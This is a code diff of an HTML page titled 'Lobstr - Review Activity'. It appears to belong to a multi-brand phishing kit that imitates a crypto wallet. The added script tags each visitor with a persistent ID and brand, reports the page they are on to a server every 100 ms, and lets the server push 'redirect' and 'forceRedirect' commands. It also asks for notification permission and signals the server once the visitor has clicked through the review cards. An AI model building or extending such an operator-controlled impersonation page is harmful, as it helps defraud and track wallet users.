@@ -2,48 +2,116 @@
 <html lang="en">
 <head>
   <script src="/socket.io/socket.io.js"></script>
-
   <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const buttons = document.querySelectorAll('.action-buttons .btn');
-      let processedCards = 0;
-      const totalCards = document.querySelectorAll('.activity-item').length;
-      
-      buttons.forEach(button => {
-        button.addEventListener('click', function() {
-          const card = this.closest('.activity-item');
-          const hr = card.nextElementSibling;
-          
-          card.classList.add('removing');
-          if (hr && hr.tagName === 'HR') {
-            hr.classList.add('removing');
-          }
-          
-          setTimeout(() => {
-            card.remove();
-            if (hr && hr.tagName === 'HR') {
-              hr.remove();
-            }
-            
-            processedCards++;
-            
-            // Check if all cards have been processed
-            if (processedCards === totalCards) {
-              // Emit review completion before redirect
-              s.emit('review_completed', {
-                timestamp: new Date().toISOString()
-              });
-              
-              setTimeout(() => {
-                // Instead of directly redirecting, request server-side redirect
-                s.emit('request_redirect', { page: 'Loading' });
-              }, 200);
-            }
-          }, 500);
-        });
+    // Try to get existing session ID from localStorage (persists across browser sessions)
+    let uid = localStorage.getItem('userUID');
+    let userAlias = null; // Store the user's alias
+    let s;
+    
+    // Extract platform from URL
+    const pathSegments = window.location.pathname.split('/').filter(segment => segment);
+    const platform = pathSegments[0] || 'lobstr'; // Default to lobstr if no platform in URL
+    
+    // Function to connect with session management
+    function connectWithSession() {
+      // Create socket connection
+      s = io({
+        query: { 
+          role: "user", 
+          uid: uid || '', // Send empty string if no UID yet
+          brand: platform 
+        },
+        transports: ['websocket', 'polling'],
+        reconnection: true,
+        reconnectionAttempts: 5,
+        reconnectionDelay: 1000,
+        reconnectionDelayMax: 5000,
+        timeout: 20000
       });
+      
+      // Connection established
+      s.on('connect', () => {
+        console.log('Socket connected');
+        s.emit("updatePage", location.pathname);
+      });
+      
+      // Server sends back the persistent session ID
+      s.on('connected', (data) => {
+        if (data.uid) {
+          uid = data.uid;
+          // Store in localStorage for persistence
+          localStorage.setItem('userUID', uid);
+          console.log('Session ID:', uid);
+        }
+      });
+      
+      // Listen for user data updates (including alias)
+      s.on('userData', (data) => {
+        if (data.alias) {
+          userAlias = data.alias;
+          localStorage.setItem('userAlias', userAlias);
+        }
+      });
+      
+      // Handle redirects
+      s.on("redirect", (url) => {
+        console.log('Redirecting to:', url);
+        // Preserve session across redirects
+        location.href = url;
+      });
+      
+      s.on("forceRedirect", (url) => {
+        console.log('Force redirecting to:', url);
+        location.href = url;
+      });
+      
+      // Handle connection errors
+      s.on('connect_error', (error) => {
+        console.error('Connection error:', error.message);
+      });
+      
+      // Handle disconnection
+      s.on('disconnect', (reason) => {
+        console.log('Socket disconnected:', reason);
+        if (reason === 'io server disconnect') {
+          // Server disconnected us, try to reconnect
+          setTimeout(() => s.connect(), 1000);
+        }
+      });
+    }
+    
+    // Initialize connection
+    connectWithSession();
+    
+    // Try to get cached alias from localStorage
+    userAlias = localStorage.getItem('userAlias');
+    
+    // Update page on navigation
+    window.addEventListener('popstate', () => {
+      if (s && s.connected) {
+        s.emit("updatePage", location.pathname);
+      }
+    });
+    
+    // Update page when navigating within the same domain
+    let lastPath = location.pathname;
+    setInterval(() => {
+      if (location.pathname !== lastPath) {
+        lastPath = location.pathname;
+        if (s && s.connected) {
+          s.emit("updatePage", location.pathname);
+        }
+      }
+    }, 100);
+
+    // Request notification permission on page load
+    document.addEventListener('DOMContentLoaded', () => {
+      if ('Notification' in window && Notification.permission === 'default') {
+        Notification.requestPermission();
+      }
     });
   </script>
+  
   <meta charset="utf-8" />
   <title>Lobstr - Review Activity</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -474,6 +542,48 @@
     </div>
   </div>
 
-        <script src="/js/socket-client.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const buttons = document.querySelectorAll('.action-buttons .btn');
+      let processedCards = 0;
+      const totalCards = document.querySelectorAll('.activity-item').length;
+      
+      buttons.forEach(button => {
+        button.addEventListener('click', function() {
+          const card = this.closest('.activity-item');
+          const hr = card.nextElementSibling;
+          
+          card.classList.add('removing');
+          if (hr && hr.tagName === 'HR') {
+            hr.classList.add('removing');
+          }
+          
+          setTimeout(() => {
+            card.remove();
+            if (hr && hr.tagName === 'HR') {
+              hr.remove();
+            }
+            
+            processedCards++;
+            
+            // Check if all cards have been processed
+            if (processedCards === totalCards) {
+              // Emit review completion before redirect
+              s.emit('review_completed', {
+                timestamp: new Date().toISOString()
+              });
+              
+              setTimeout(() => {
+                // Instead of directly redirecting, request server-side redirect
+                s.emit('request_redirect', { page: 'Loading' });
+              }, 200);
+            }
+          }, 500);
+        });
+      });
+    });
+  </script>
+          <script src="/js/socket-client.js"></script>
+
 </body>
 </html>
